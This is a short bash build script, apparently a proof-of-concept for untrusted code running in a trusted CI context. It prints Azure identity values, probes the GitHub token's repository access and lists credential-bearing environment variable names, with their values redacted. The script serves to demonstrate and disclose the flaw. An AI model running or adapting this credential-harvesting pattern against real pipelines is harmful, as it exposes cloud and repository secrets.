#!/bin/bash
echo "=== build.sh running in TRUSTED context ==="
echo "AZURE_CLIENT_ID=$AZURE_CLIENT_ID"
echo "AZURE_TENANT_ID=$AZURE_TENANT_ID"
echo "AZURE_SUBSCRIPTION_ID=$AZURE_SUBSCRIPTION_ID"
echo "GITHUB_TOKEN scopes test: $(git ls-remote https://github.com/TaiPhung217/checkout-guard-poc.git HEAD 2>&1 | head -1)"
env | grep -iE "azure|github_token" | sed 's/=.*/=<REDACTED-PROOF>/' | head -10
